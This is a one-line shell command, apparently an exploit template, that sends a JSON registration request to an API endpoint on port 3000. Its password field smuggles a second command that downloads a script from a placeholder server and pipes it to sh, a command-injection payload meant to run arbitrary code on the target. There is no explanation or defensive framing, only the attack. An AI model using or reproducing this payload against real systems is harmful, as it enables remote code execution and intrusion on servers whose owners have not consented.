wget --post-data='{{"username":"...","password":"; wget -O - http://<some-server>/script | sh;#"}}' --header 'Content-Type:application/json'  http://{ip}:3000/api/{API_KEY}/auth/register
